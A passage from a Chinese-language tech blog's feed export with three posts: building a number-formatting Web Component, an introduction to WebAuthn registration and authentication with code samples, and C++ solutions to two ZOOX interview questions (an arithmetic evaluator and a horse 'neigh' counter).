Idea在一些活動頁面或是互動性較高的網站中，顯示參與人數是很常見的功能，而有些時候我們並不需要很確切的數目，反倒是希望能夠約分成以 K（千） 或 M（百萬） 為單位，這時通常我會寫個類似下面這樣的小函式來作轉換，並在每個需要的 React Component 中去 require 這個函式使用：
function formatNumber(num) &#123;    return num &gt; 999 ? (num/1000).toFixed(1) + &#x27;k&#x27; : num&#125;

但就只是個很簡單的函示，卻每個需要的 Component 都要 require 一次，久了就會覺得怎麼 HTML 5 不出一個 tag 是可以幫我把數字直接做 format 的呢？這樣我就只要用對 Tag，就會有我要的結果了，也不用特別去寫個小 function。
想到這就覺得似乎是個好機會來練習一下 Web Comopnent 的實作，而且依照 React 的官方說法 Web Component 跟 React 是可以相互在對方的環境下使用的！那還等什麼呢！
那就來實作吧根據上一次的學習 2017，讓我們再來看看 Web Components 吧！，很快的就能建立好基本的架構：
formatNum.html&lt;!-- template --&gt;&lt;template id=&quot;format-num-template&quot;&gt;  &lt;style&gt;    :host &#123;      position: relative;    &#125;  &lt;/style&gt;  &lt;span class=&quot;wrapper&quot;&gt;    &lt;slot&gt;&lt;/slot&gt;  &lt;/span&gt;&lt;/template&gt;&lt;!-- custom element --&gt;&lt;script&gt;class formatNum extends HTMLElement &#123;    constructor() &#123;      super();      let shadowRoot = this.attachShadow(&#123;mode: &#x27;open&#x27;&#125;);      const t = document.querySelector(&#x27;#format-num-template&#x27;);      const instance = t.content.cloneNode(true);      shadowRoot.appendChild(instance);      this.shadowDOM = shadowRoot;    &#125;  &#125;  customElements.define(&#x27;format-num&#x27;, formatNum);&lt;/script&gt;

接著我開始構想這個 tag 需要有哪些 attribute 可以設置，最基本我會需要能指定小數點後的位數，並且能指定轉換單位的型態，因為有時候可能會需要二進位的轉換，也就是以 1024 為單位，而有時需要計算人數時，則是以 K, M, B 來顯示。
因此會需要設置兩個 attribute，digits 與 si：
static get observedAttributes() &#123;    return [&#x27;digits&#x27;, &#x27;si&#x27;];&#125;get digits() &#123;    return this.hasAttribute(&#x27;digits&#x27;);&#125;set digits(val) &#123;    if (val) &#123;    this.setAttribute(&#x27;digits&#x27;, val);    &#125; else &#123;    this.removeAttribute(&#x27;digits&#x27;);    &#125;&#125;get si() &#123;    return this.hasAttribute(&#x27;si&#x27;);&#125;set si(val) &#123;    if (val) &#123;    this.setAttribute(&#x27;si&#x27;, val);    &#125; else &#123;    this.removeAttribute(&#x27;si&#x27;);    &#125;&#125;

記得要設置 observedAttributes，這樣使用者改變 tag 的 digits 與 si 時，我們才可以有對應動作，也就是重新 format 一次數字。
接著加入下列兩個關鍵 method：
attributeChangedCallback(name, oldValue, newValue) &#123;    this.formatNum();&#125;    formatNum() &#123;    const num = this.shadowDOM.querySelector(&#x27;slot&#x27;).textContent;    const digits = this.getAttribute(&#x27;digits&#x27;);    const si = this.hasAttribute(&#x27;si&#x27;);    this.shadowDOM.querySelector(&#x27;slot&#x27;).textContent = this.format(num, digits, si);&#125;

我們在 observedAttributes 中列舉的 attribute 只要有所變動都會觸發 attributeChangedCallback，並且執行 formatNum()，而 formatNum() 就會從 shadowDOM 中抓出數字，並且從 attribute 中抓出小數點位數以及是哪種單位，經過 format() 的轉換後再將資料塞回 shadowDOM 中。（ format() 就是類似最上方的數字單位轉換函示，不是重點就不列出，有興趣可以到我的 git repo 連結去看）
寫到這邊看起來就大功告成了，嗯，我也這麼覺得。
但是事情就是沒有憨人想得這麼簡單。
當我在 html 裡面加上我新增的 element &lt;format-num digits=&#39;1&#39;&gt;1234&lt;/format-num&gt; 時，竟然毫無反應，就只是個 1234，而不是 1.2k。
原因是我以為在執行 formatNum() 的時候，可以從 this.shadowDOM.querySelector(&#39;slot&#39;).textContent 裡面取得 slot 內的值的，但似乎無法直接這樣做，就算能透過 shadowDOM 存取，當我們想要將 format 過的數字塞回 tag 內的時候，由於原先的 1234 屬於 light DOM，我們需要透過 document.querySelect(&#39;format-num&#39;).innerHML 的方式去改值，這樣變成由外部的 context（document) 來更改 light DOM，似乎有點不符 web component 的精神，應該要讓一切操作保持在內部才對。
因此換個方式，我們不讓使用者將值寫在 slot 中，而是透過 attribute 來設置，而我們再將 parse 過的結果利用 shadowDOM 設置到 slot 中，這樣就能順利顯示了！
修改程式如下：
// 增加 num attributestatic get observedAttributes() &#123;    return [&#x27;digits&#x27;, &#x27;num&#x27;, &#x27;si&#x27;];&#125;get num() &#123;    return this.hasAttribute(&#x27;num&#x27;);&#125;set num(val) &#123;    if (val) &#123;    this.setAttribute(&#x27;num&#x27;, val);    &#125; else &#123;    this.removeAttribute(&#x27;num&#x27;);    &#125;&#125;// ...// 修改 formatNum()，從 attribute 中拿 num 的值，並透過 shadowDOM 塞進 slot 顯示attributeChangedCallback(name, oldValue, newValue) &#123;    if (this.digits || this.num) &#123;    this.formatNum();    &#125;&#125;formatNum() &#123;    const num = this.getAttribute(&#x27;num&#x27;);    const digits = this.getAttribute(&#x27;digits&#x27;);    const si = this.hasAttribute(&#x27;si&#x27;);    this.shadowDOM.querySelector(&#x27;slot&#x27;).textContent = this.format(num, digits, si);&#125;

成果：
JS Bin on jsbin.com
讓別人 Import 你的 Webcomponent本來想說做完了，準備要發佈的時候，發現需要準備 Demo page，雖然我都直接在 jsbin 與 codepen 上方寫，還沒有真正在別的 page Import 過 webcomponent，但想說應該就很簡單啊，把我的 code 都放在一個 html 內，然後透過 &lt;link rel=&quot;import&quot; href=&quot;../src/formatNum.html&quot;&gt; 不就得了？
正當我這麼想的時候，卻發現我的 demo page 一直無法正常顯示，出現 “Uncaught TypeError: Cannot read property ‘content’ of null” 的 error，是在 custom element constructor 的地方：
const t = document.querySelector(&#x27;#format-num-template&#x27;);const instance = t.content.cloneNode(true);

竟然找不到我的 template ?!
仔細研究了好一陣子後才發現到這篇文章 introduction to html imports
裡面有提到 html import 時的行為差異，舉例來說：
index.html
&lt;link rel=&quot;import&quot; href=&quot;formatNum.html&quot;&gt; // 1.&lt;title&gt;Import Example&lt;/title&gt;&lt;script src=&quot;script3.js&quot;&gt;&lt;/script&gt;     // 4.

formatNum.html
&lt;script src=&quot;js/script1.js&quot;&gt;&lt;/script&gt;  // 2.&lt;script src=&quot;js/script2.js&quot;&gt;&lt;/script&gt;  // 3.

以上面的例子來說明，index.html 載入 formatNum.html，其 script 的執行順序如上面標記，但 index.html 與 formatNum.html 中的 document 物件卻都是指向 index.html。
因此當我的 demo page 在執行存在於 formatNum.html 內的 script，也就是 constructor 時，document 就找不到存在於 formatNum.html 內的 template 了。
所以該怎麼解決呢？
為了要保存住 formatNum.html 自己的 document object，我們可以這樣做：
documentCurrentScript = document._currentScript || document.currentScript;var mainDoc = documentCurrentScript.ownerDocument;

currentScript 是只有在有支援 HTML import 的瀏覽器中才有的屬性，若是透過 webcomponent.js 等 polyfill，則是用 _currentScript
打包發佈問題都解決以後當然就要發佈到 Webcomponent.org 上面去了

從網站上的步驟看來很簡單，只要你的 repository 滿足三個條件，並加上 badge 與 inline demo，就可以發佈了：


三個條件：

有 Open source license，只要是被 Open Source Initative 認可的都可以。

Tagged release，這點很重要，他會依照你 repository 裡面的 tag 去抓檔案，如果你沒有設置的話，就算 repo 中有程式，也會發佈失敗，而且如果你有更新，也一定要有新版 Tag release，Webcomponent.org 這邊才會更新。我一開始因為有些設定沒做好，重新 push 後忘了 release tage，怎麼樣都是發佈失敗…

README，這當然也是很重要，你總得要介紹一下內容。此外，如果你想要放 inline demo 的話，也是要設置在 README.md 當中。


加上 badge：
[![Published on webcomponents.org][webcomponents-image]][webcomponents-url][webcomponents-image]: https://img.shields.io/badge/webcomponents.org-published-blue.svg[webcomponents-url]: https://www.webcomponents.org/element/arvinh/format-num

Inline Demo：
要製作 inline demo 很簡單，只要在你的 README.md 中加入：

你只需要在 &lt;custom-element-demo&gt; 中 import 你的 custom-element 即可，html block 內的就是你 demo 元件的地方了。
以我的 README.md 來說，完成後會長這樣：

當你照著網站上所寫的，完成所有步驟後，可以到這邊去填寫 Repo 名稱並進行發佈。

然後你會發現發佈失敗，因為網站隱藏了一個步驟沒有寫到。
他會要求你的 repo 中要含有 bower.json，但應該是沒有要你 register 到 bower 中，不過我有順手放上去就是了，所以也能透過 bower install format-num 來下載這個 webcomponent。
總之，加上 bower.json 以後應該就能順利發佈了！
此外，你也可以到 https://www.webcomponents.org/preview 輸入你的 git repo url，就可以在發佈前先進行 preview，在這邊甚至能動態調整你的 inline demo！就由讀者自行玩玩吧！
Work with React but failed製作這個 Web Component 的初衷是希望能夠透過它讓我輕鬆地放在 React 的 component 中當一般 tag 使用，因此我也嘗試了一下簡單的範例：
See the Pen web-component:  with React by Arvin (@arvin0731) on CodePen.


但眼尖的讀者會發現，我在 html 內又再寫了一次 template…
沒錯，因為再度遇到 document 存取不到 template 的 error，這次連使用 currentScript 都無法解決，我想是跟 Rect compile 的時間以及 Webcomponent script 載入執行的時間順序有關，導致存取不到正確的 document scope。
當然這也只是我的猜測，若有讀者了解原因請不吝指教！
在試著整合 React 的過程中也有發現，babel 在處理 extends HTMLElement 的元件上有些衝突，需要透過 babel-plugin-transform-custom-element-classes 來解，不過沒有真正試過，畢竟我會希望 webcomponent 是獨立的，不需要跟 React 一起經過 babel 的 compile，而在支援 webcomponent 的 browser 上，理論上也不需要 babel 編譯 es6 的 code 才對…
結論雖然最後還是沒能順利整合進 React 當中，不過原先預期輕鬆完成的小玩具竟然還是卡了不少關，也有學習到，不過總是因為時間有限沒辦法很完整的將查到的資料認真讀完，或許我的實作過程與觀念的理解有錯誤的地方，歡迎讀者留言指教，我會非常感激的！
資料來源
Web Components org
Introduction to html import
React could love web components

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web component,js,html</tag>
      </tags>
  </entry>
  <entry>
    <title>一起來了解 Web Authentication</title>
    <url>/2019/08/17/webauthn-intro/</url>
    <content><![CDATA[前言在今年年初的時候，W3C 正式將 Web Authentication (WebAuthn) 列入正式標準，開發者可以透過 API 啟動 FIDO 2 驗證，讓使用者透過行動裝置、指紋辨識或硬體安全金鑰來登入帳號，不需輸入密碼！
雖然目前支援度還不高，但既然已成為標準，沒理由不來認識一下何謂 Web Authentication，以及我們可以如何使用。今天就一起來了解我們能如何使用 Web Authentication，增加網站安全性，並免除密碼帶給我們的諸多麻煩。
先回憶一下我們平常的註冊登入方式不管是手機 application 或是網站，只要是需要登入操作的，勢必都會提供一個頁面讓你註冊帳號與密碼，接著你才能拿著這組帳密登入進行使用。這是我們習以為常的使用方式，但隨之而來的問題大家也是見怪不怪：

每個網站都要想一組新密碼，若用太固定的 pattern 又容易被猜到。
太複雜的密碼容易忘記。
自己要防範釣魚網站。
需要擔心該網站被入侵，密碼遭偷竊。

而大約有三成左右危機意識較高的使用者會啟用 2FA (2 factor authentication)，但這何嘗不是為使用上帶來更多不便？
因此 WebAuthn 就是希望來解決這些問題，為我們使用者提供一個除了密碼登入以外的選項。
再來說明一下基本觀念聽到所謂免密碼登入，應該很容易聯想到我們透過 SSH 連進遠端 Server 時，大多也會設定免密碼登入，透過的是 Public-key cryptography 或又稱 asymmetric cryptography，也就是利用產生一組非對稱的加密金鑰：private key 與 public key，又可稱作 credential，讓使用者自己保管 private key，而服務端利用 public key 來驗證使用者的身份。
WebAuthn 也是利用相同的加密原理來達成免密碼的 Authentication。

進入 API 細節前，我們科普一下，Web Authentication 與 FIDO其實很多人會誤解，以為 WebAuthn 指的就是上述利用非對稱加密來達到 authentication 的技術，但實際上，真正規範這項技術的是 FIDO2，FIDO2 是 FIDO Alliance 的最新規範，裡面包含了一系列技術，讓使用者能透過一些普通的設備，輕易的與線上服務進行 authentication，無論是 Mobile 或是 Desktop。
FIDO2 規範包含了 WebAuthn 與 Client-to-Authenticator Protocol (CTAP)
ref: fidoalliance.org
也就是說，WebAuthn 其實是 FIDO2 的一部分，用來規範標準的 Web API 讓瀏覽器實作。
目前支援的瀏覽器有 Chrome, Firefox, Edge 與 Safari preview 版。另外也可以再多參考 Duo 的文章。
我們稍微解釋一下上圖：
當使用者像應用程序要求註冊或登入時，使用 FIDO2 的服務端 (RP App Server) 會告知瀏覽器說，我們現在要用 FIDO Authentication，而瀏覽器則會使用 WebAuthn API，透過 CTAP protocol 來與 Authenticator 溝通，存取到需要的資訊並產生 public key 傳回給服務端。
這邊出現兩個新名詞：RP app server 與 Authenticator。
所謂的 RP (Relying Party)，描寫的就是負責註冊與認證使用者的組織或是服務，基本上我覺得就是你的伺服器。
而 Authenticator 就是負責產生 credential 的軟硬體，例如：TouchID, YubiKey 等等。TouchID 這種存在於設備內部的，屬於 “platform” type，而 Yubikey 這類外部硬體設施則屬於 “cross-platform” type。
Web Authentication 的主要特性：
強健的安全體系：Authentication 有安全性硬體作為支援，來儲存私鑰與進行 Web Authentication 需要的加密運算。

效用受到作用域規範：產生的 Credential keypair 是綁定在 origin 上的，意思是說，註冊在 “techbridge.com” 的 keypair 是不能用在 “bad-techbridge.com” 的網域上頭，消除了釣魚攻擊的危險。

受認證的（Attested）：上面提到負責產生 credential 的 Authenticators 可以提供 certificate 來幫助服務端驗證拿到的 public key 是由可信任的 authenticators 發出，而非有害的來源。


Web Authentication API - Registering接著我們可以開始來看看如何使用 Web Authentication API 來註冊使用者 （參考至 Duo 的 webauthn.guide：
navigator.credentials.create()
首先，Server 利用 navigator.credentials.create() 來產生 client 的 credential
const credential = await navigator.credentials.create(&#123;    publicKey: publicKeyCredentialCreationOptions&#125;);

publicKeyCredentialCreationOptions 中有一堆 required 與 optional 的欄位需要填寫：
// should generate from serverconst challenge = new Uint8Array(32);window.crypto.getRandomValues(challenge);const userID = &#x27;Kosv9fPtkDoh4Oz7Yq/pVgWHS8HhdlCto5cR0aBoVMw=&#x27;;const id = Uint8Array.from(window.atob(userID), c=&gt;c.charCodeAt(0));const publicKeyCredentialCreationOptions = &#123;    challenge,    rp: &#123;        name: &quot;Tech Bridge&quot;,        id: &quot;techbridge.inc&quot;,    &#125;,    user: &#123;        id,        name: &quot;arvin@techbridge.cc&quot;,        displayName: &quot;Arvin&quot;,    &#125;,    pubKeyCredParams: [&#123;alg: -7, type: &quot;public-key&quot;&#125;],    authenticatorSelection: &#123;        authenticatorAttachment: &quot;platform&quot;,    &#125;,    timeout: 60000,    attestation: &quot;direct&quot;&#125;;

challenge：challenge 是由 server 產生的一個 buffer，裡面含有一串隨機加密過的 bytes，用來防止 “replay attacks”。這邊單純 demo，用 Unit8Array 與 window.crypto.getRandomValues 做個示範。
rp：先前解釋過，代表 “relying party”，指的就是註冊與認證使用者的網站。其中，id 一定要是目前網站的 domain 的 subset，像是如果是從 techbridge.cc 觸發 WebAuthn 認證，那這邊的 id 就得填寫 techbridge.cc。
user：就是目前想要註冊的使用者的資訊，這邊的 id 很重要，authenticator 會用這個 id 來與 credential 做連結，這樣之後才能透過一樣的 id 與一樣的 autenticator 去認證你是同個 user。而這資訊可能會被存在 authenticator 中，依據不同載具與實作會有不同，但是因為有這可能性存在，所以一般不建議 id 內藏有可以認出你本身的相關個人資訊，像是生日等等的。
pubKeyCredParams：這個 array 用來描述 Server 支援哪些 types 的 public key (signing algorithms) 。目前 FIDO2 servers 授權支援 RS1、RS256 與 ES256。 alg 的數字對應可以從 COSE 去找。
authenticatorSelection (optional)：可以用來限制 Relying parties 支援的 authenticators 種類，像這邊我指定 platform，就是 Touch ID 之類內建的 authenticators。
timeout (optional)：以 milliseconds 為單位，表示說如果使用者在這段 timeout 時間內沒有回應 prompt 的話，就會回傳認證失敗。
attestation (optional)：attestation data 是從 authenticator 回傳的內容，server 可以用這個選項來決定要跟 authenticators 拿多少資訊，有三種選項：none、indirect 與 direct。none 指的是 server 不在意 attestation 資料；indirect 表示願意只拿匿名的 attestation 資料；而 direct 代表要求 authenticator 回傳所有 attestation data。
看了一些程式碼，來嘗試一下吧現在打開瀏覽器的 console，把上面那段 code 複製上去，然後你會發現什麼事都沒發生？！
因為上面那段 code 當中，我們在 rp 中的 id 有指定 techbridge.inc，而這並非你目前所在的 domain，因此無法啟用 WebAuthn。
修改一下，將 rp 中的 id 移除，再試一次：

就可以 credentials 了！
另外，因為我們在 authenticatorSelection.authenticatorAttachment 中有指定 platform，所以當我們一請求 credential 後，Chrome 會直接跳出 prompt 要求使用 TouchID（上面出現 codepen.io 是因為我在 codepen.io 的頁面 console 測試：

但如果今天你沒有指定，或是指定為 cross-platform，則會顯示如下兩種 prompt：
cross-platform：
會要求你插入實體 usb key。

不指定：
你有兩種選項可以選擇，使用 TouchID 或是實體 usb key。

Parsing 與 Validating 註冊資料從剛剛的範例可以看到，呼叫 navigator.credentials.create 後會回傳一個 credential 物件：
console.log(credential);PublicKeyCredential &#123;    id: &#x27;ADSUllKQmbqdGtpu4sjseh4cg2TxSvrbcHDTBsv4NSSX9...&#x27;,    rawId: ArrayBuffer(59),    response: AuthenticatorAttestationResponse &#123;        clientDataJSON: ArrayBuffer(121),        attestationObject: ArrayBuffer(306),    &#125;,    type: &#x27;public-key&#x27;&#125;

其中：
id：代表產生的 credential，在對 user 進行 authentication 時，用此 id 來 identify user credential，是 base64-encoded string。
rawId：同上，只是是 binary form。
response.clientDataJSON：是瀏覽器產生的一組資料，包含 origin、challenge 等等，這個資料重要在於可以用來防止 phishing attemp。此外，內容是由 authenticator 加密過的。
response.attestationObject：包含了 credential public key、optional attestation certificate 與其他 metadata，用 CBOR encoded 過的 binary data。
拿到 PublicKeyCredential 後，就可以送到 Server 端去進行驗證與後續動作。
WebAuthn 規範中有描述了一系列驗證 registration data 的程序，而實作部分則與你用什麼語言有所不同，可以參考 Duo Labs 的 Go 與 Python 版本。
這邊以 JavaScript 為例說明：
首先，Server 端需要先解析 clientDataJSON：
// decode the clientDataJSON into a utf-8 stringconst utf8Decoder = new TextDecoder(&#x27;utf-8&#x27;);const decodedClientData = utf8Decoder.decode(    credential.response.clientDataJSON)// parse the string as an objectconst clientDataObj = JSON.parse(decodedClientData);console.log(clientDataObj)&#123;    challenge: &quot;ZVTQWf9y7JkEjKFH-iWiKL4FTtTrQJwhYt2kiJQlcM8&quot;    origin: &quot;https://codepen.io&quot; // again, 因為我在 codepen.io 的頁面 console 測試，所以 origin 才會是這個    type: &quot;webauthn.create&quot;&#125;

這邊我們拿出 challenge、origin 與 type 來驗證，challenge 應該要與當初 Server 產生的一致、origin 要正確，且 type 要確定為 create，才能代表是在註冊使用者。如此來避免釣魚與 replay attacks。
接著，處理 attestationObject，由於是由 CBOR encode，所以需要額外找 lib 來 decode：
// 需要找個 CBOR lib 來 decodeconst decodedAttestationObj = CBOR.decode(credential.response.attestationObject);console.log(decodedAttestationObj);&#123;    authData: Uint8Array(196),    fmt: &quot;fido-u2f&quot;,    attStmt: &#123;        sig: Uint8Array(70),        x5c: Array(1),    &#125;,&#125;

解碼出來後的 attestationObject 含有幾項資訊：

authData：authData 這個 byte array 包含著所有 registration event 的 metadata，以及 public key。

fmt：這個是包含著 attestation 的 format，如果你在 create credentials 時有要求 Authenticators 提供 attestation data，那 server 可以從這個欄位知道該如何 parse 與 validate attestation data。

attStmt：這就是要求來的 attestation data，根據 fmt 的不同會有不同的結構，以這邊範例為例，我們拿到的是一個 signature 與 x5c certificate，servers 可以用這資料來驗證 publickey 是不是來自預期的 authenticator，或是根據 authenticator 的資訊而 reject authenticate (像是覺得不能信任該 certifacate，等等)


最後可以從 authData 中取得更多資料：credentialId、publicKeyBytes、publicKeyObject 等等：
const &#123;authData&#125; = decodedAttestationObject;// get the credential IDconst credentialId = authData.slice(55, credentialIdLength);// get the public key objectconst publicKeyBytes = authData.slice(55 + credentialIdLength);// the publicKeyBytes are encoded again as CBORconst publicKeyObject = CBOR.decode(publicKeyBytes.buffer);

整個 Validation process 完成後，Server 就能將 publicKeyBytes 與 credentialId 存進資料庫，與使用者關聯起來。
到這邊為止，我們走完了 Registering 的流程。而剛剛都是直接在 console 貼入程式碼，如果想看稍微”真實“一點的範例，可以到 https://herrjemand.github.io/FIDO2WebAuthnSeries/WebAuthnIntro/makeCredExample.html 這個網址玩玩看，點選 button 註冊的流程。

接著，再努力一下，看看 Authenticating，也就是登入時要走的步驟吧！
Web Authentication API - AuthenticatingAuthenticated 的過程中，使用者會用其持有的 private key 簽上一個 signature 到 assertion 上頭，並傳給 server，server 則利用 public key 來驗證該 signature。
navigator.credentials.get()
Authentication 的過程在於使用者要證明他們擁有註冊時所提交的 key pair 中的 private key。證明方法為利用 navigator.credentials.get() 取得註冊時的 credential，並附上 signature。
const credential = await navigator.credentials.get(&#123;    publicKey: publicKeyCredentialRequestOptions&#125;);

const challenge = new Uint8Array(32);window.crypto.getRandomValues(challenge);const publicKeyCredentialRequestOptions = &#123;    challenge,    allowCredentials: [&#123;        id: credentialId, // from registration        type: &#x27;public-key&#x27;,        transports: [&#x27;usb&#x27;, &#x27;ble&#x27;, &#x27;nfc&#x27;],    &#125;],    timeout: 60000,&#125;const assertion = await navigator.credentials.get(&#123;    publicKey: publicKeyCredentialRequestOptions&#125;);

跟註冊時比較不同的是 allowCredentials，這欄位是 Servers 端想要瀏覽器提供的 credentials 資訊，用來認證使用者，其中 id 為註冊時獲取的 credentialId。此外也能指定要用哪種方式傳輸 credentials (usb、bluetooth 或 NFC)。你可以填入多個 credentialId，authenticator 會找出他認識的來使用。
navigator.credentials.get 取得的 assertion 也是一個 PublicKeyCredential object，跟註冊時的差別在於，這次我們拿到的多了 signature，少了 public key。
console.log(assertion);PublicKeyCredential &#123;    id: &#x27;ADSUllKQmbqdGtpu4sjseh4cg2TxSvrbcHDTBsv4NSSX9...&#x27;,    rawId: ArrayBuffer(59),    response: AuthenticatorAssertionResponse &#123;        authenticatorData: ArrayBuffer(191),        clientDataJSON: ArrayBuffer(118),        signature: ArrayBuffer(70),        userHandle: ArrayBuffer(10),    &#125;,    type: &#x27;public-key&#x27;&#125;

基本結構都差不多，多出來的 signature 是由 private key 與此 credential 所產生，在 server 端可以用 public key 來驗證此 signature。
userHandle 則是 authenticator 提供的使用者 id，也是註冊時使用的那組。在 Server 端可以用來關聯使用者。
Parsing 與 Validating 登入資料拿到 assertion 後，可以送往 server 進行驗證，server 會用註冊時的 public key 來驗證 signature。
一樣，Server 端實作有各種語言版本：Go 與 Python，等等。
這邊簡單舉例：
首先，從資料庫中取得 credential。接著利用 public key 和 client 傳來的 signature 與 authenticator data 和 SHA-256 hash 過的 cliendDataJSON 做驗證。
const storedCredential = await getCredentialFromDatabase(userHandle, credentialId);const signedData = (authenticatorDataBytes + hashedClientDataJSON);const signatureIsValid = storedCredential.publicKey.verify(signature, signedData);if (signatureIsValid) &#123;    return &quot;Nice! User is authenticated!&quot;;&#125; else &#123;    return &quot;Oops, verification failed.&quot;&#125;

這樣我們就把一段無密碼登入的註冊與登入流程都走完了！一樣，可以到 https://herrjemand.github.io/FIDO2WebAuthnSeries/WebAuthnIntro/PasswordlessExample.html 來玩玩看實際一點的範例。

結論與更多資源今天花了點時間把 Web Authentication 的概念與大致的實作方式瞭解了一番，雖然才剛成為標準，離全部瀏覽器都支援還需要一點時間，但最新版的瀏覽器幾乎都已支援（至少桌機版），想必不久的未來，passwordless 的登入會是一種趨勢。
這邊再多提供幾個網站資源供大家參考，裡面有更為豐富的範例程式，以及詳細的 API 與情境解說：

Duo blog - Duo 是 Cisco 旗下的公司，主要發展與 Authentication 與 security 相關的產品，也因此針對 web authentication 有不少的文章教學與介紹。

FIDO2WebAuthnSeries - 這是我在找資料過程中發現的範例 github，裡面有多種情境的 source code 與 demo，推薦大家去玩玩看，看看程式碼，想必會更加了解。作者也有在 Medium 上寫了一篇長文介紹，更詳細的說明各種情境的 Web authentication 應用會是如何的流程，而我們的程式碼又該如何修改。如果覺得這篇文章內的範例與說明不夠清楚，可以到他的 medium 看看。


資料來源
webauthn.guide
Introduction to WebAuthn API
FIDO2WebAuthnSeries
webauthn.io
Web Authentication API - MDN

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>web</tag>
        <tag>security</tag>
        <tag>authentication</tag>
      </tags>
  </entry>
  <entry>
    <title>ZOOX 自動駕駛公司面試題目</title>
    <url>/2019/07/05/zooz-2018-oa/</url>
    <content><![CDATA[前言ZOOX 是一間做自動駕駛的新創公司，今天就來跟大家分享一下他們常出的 OA（Online Assessment）題目跟解法（用 C++ 實作）。題目出自一畝三分地論壇的分享。
題目一 - Arithmetic expression evaluation題目敘述Write a program that takes a single line of input,representing an arithmetic expression.The expression will consist of numeric digits (0-9),the plus operator (+) and the multiplication operator (*).The given expression will be a valid arithmetic expression(ie. &quot;*2++&quot; is not valid).Your task is to evaluate the arithmetic expression,following the normal rules of operator precedence,and print the result without any leading or trailing whitespace.The resulting numbers will fit in a normal integer.Example Input20+2*3Example Output26

題意理解與連結這題基本上就是要寫一個基礎版的計算機(只有 0-9, +, *)，對應到的 leetcode 題目是： 227 - Basic Calculator II。
解法要思考這個題目，最關鍵的地方在於我們需要處理的 operator - ‘+’ 跟 ‘*‘，這兩個 operator 有一些性質：

+ 跟 * 都符合交換律，A+B+C &#x3D; (A+B)+C &#x3D; A+(B+C)，A*B*C &#x3D; (A*B)*C &#x3D; A*(B*C)。

* 要比 + 先被計算，不然會得到錯的結果。


其中 2 是我們要比較注意的，以高階的概念來思考：

要嘛就是先處理掉所有 * 的運算，最後就只剩 +，那就把剩下的所有數字加總就好
不然就是要能夠在遇到 * 的時候，把 * 前面的數字再拿出來，跟 * 後面的數字相乘完，然後加回去

而如果要實作成程式，2 的做法是比較容易的(因為我們可以順著 input 的方向 iterate 過 input 一次就好)，比如說 20+2*3，如果我們可以先用一個資料結構存 [20, 2]，那當我們遇到 3 的時候，我們就可以把 2 從資料結構中拿出來，跟 3 相乘之後再放進資料結構，變成存 [20, 6]。
這樣做的好處是感覺可以擴展，例如 20+2*3*5，遇到 5 的時候，就從 [20, 6] 拿出 6，跟 5 相乘完再放回資料結構，資料結構裡面存的東西就變成 [20, 30]。然後最後再把資料結構中的的所有數字加總就好。
所以到目前為止，我們想出了一個可能的演算法：

如果遇到數字，就先計算這個數字的值（要記住我們現在的 input 是字串，所以需要把數字的部分處理完才能得到 int）
如果數字前面的 operator 是 +，就先把目前的數字放進資料結構
如果數字前面的 operator 是 *，就把資料結構中最晚放進去的數字拿出來，跟現在的數字相乘完，再放進資料結構
處理完字串，加總資料結構中所有數字

看到這邊，我們會發現這個資料結構主要得有兩個功能：

記錄所有的數字
能夠吐出最後放進去的數字

那顯然就是一個 stack。
把以上的想法寫成程式碼，就可以實作出下面的 code 囉：
class Solution &#123;public:  int calculate(string s) &#123;    // 如果字串裡沒東西，那答案就是 0    int len = s.length();    if(len == 0) return 0;    stack&lt;int&gt; st;    int num = 0;    char sign = &#x27;+&#x27;;        for(int i=0; i&lt;len; i++)&#123;      // 如果遇到數字，就先計算這個數字的值      if(isdigit(s[i]))        num = num*10 + (s[i]-&#x27;0&#x27;);            if((!isdigit(s[i]) &amp;&amp; &#x27; &#x27; != s[i]) || i==len-1)&#123;        // 如果數字前面的 operator 是 +，就先把目前的數字放進資料結構        if(sign==&#x27;+&#x27;) &#123; st.push(num); &#125;            // 如果數字前面的 operator 是 *，就把資料結構中最晚放進去的數字拿出來        // 跟現在的數字相乘完，再放進資料結構        if(sign==&#x27;*&#x27;) &#123; int t = st.top()*num; st.pop(); st.push(t); &#125;                sign = s[i];        num = 0;      &#125;    &#125;    // 處理完字串，加總資料結構中所有數字    int res = 0;    while (!st.empty()) &#123;      res += st.top();      st.pop();    &#125;    return res;  &#125;&#125;;

如果有興趣探討更多 calculator 相關問題的話，可以把 Leetcode 上的 Basic Calculator 系列都做一做，然後可以參考這篇討論 - Development of a generic solution for the series of the calculator problems。
題目二 - 馬叫聲的錄音題目敘述There are a lot of horses in the yard,and we want to count how many there are.Unfortunately, we&#x27;ve only got a recording of the sounds from the yard.All the horses say &quot;neigh&quot;.The problem is they can &quot;neigh&quot; many times.The recording from the yard is sadly all mixed together.So, we need to figure out from the overlapping sounds how many horses there could be.For example, we&#x27;ve got two horses in the yard, and we hear this &quot;neigneighh&quot;.From this recording, we can successfully deduce there are 2 horses.Another example is &quot;neighneigh&quot;.From this example, we can only tell there is one horse in the yard.As an additional complexity, our recording might not be perfect.If it&#x27;s a bad recording, we should give &quot;Invalid&quot; as the response.The input will be given as a string on one line.The output should be printed on it&#x27;s own line.Sample InputnenigehnieighghSample Output2

題意理解與連結這題主要就是要看目前錄到的字串中，到底可能同時有幾匹馬在叫。而我們要知道同時有幾匹馬在叫，就看到底有幾個 “neigh” 同時在進行，比如下例就是有 5 匹馬同時在叫：
“nnnnneeeeeiiiiiggggghhhhh”。
解法一 - 簡單暴力法看完上面的題目敘述，最直覺的想法應該是可以看現在有幾個 n，知道已經有幾匹馬叫了，然後看到 h，就知道有一匹馬叫完了，而我們只要計算整個 record 中最多同時有幾個還沒被 h 結束的 n，就知道最多同時有幾匹馬在叫了。
這個想法要實作也很簡單，程式碼如下：
#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int parse_record(string s) &#123;  int max = 0, cur = 0;  for(int i = 0; i &lt; s.length(); i++) &#123;    char c = s[i];    if (c == &#x27;n&#x27;) &#123; cur++; &#125;    if (c == &#x27;h&#x27;) &#123; cur--; &#125;    if (cur &gt; max) &#123; max = cur; &#125;  &#125;    return max;&#125;int main() &#123;  string s = &quot;nenigehnieighgh&quot;;    int horses = parse_record(s);    cout &lt;&lt; &quot;There are at least &quot; &lt;&lt; horses &lt;&lt; &quot; horses in the yard.\n&quot;;  return 0;&#125;

不過題目如果這麼簡單，那就太好了XD
大家如果記得題目，裡面有說
As an additional complexity, our recording might not be perfect.If it&#x27;s a bad recording, we should give &quot;Invalid&quot; as the response.

